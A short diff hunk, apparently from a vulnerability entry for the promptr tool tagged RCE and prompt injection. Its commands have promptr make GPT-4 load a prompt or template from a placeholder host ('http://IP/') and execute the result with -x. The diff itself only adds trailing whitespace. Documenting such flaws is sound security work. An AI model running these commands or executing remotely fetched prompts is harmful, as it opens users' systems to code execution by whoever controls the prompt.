@@ -2,7 +2,7 @@ version: 6.0.7
 
 tag: RCE, Prompt, FunctionCalling
 
-promptr -m gpt4 -p "http://IP/prompt.txt" -x
+promptr -m gpt4 -p "http://IP/prompt.txt" -x  
 promptr -m gpt4 -t "http://IP/template.txt" -p "apple" -x
 
 promptr can load prompt/template file from the url
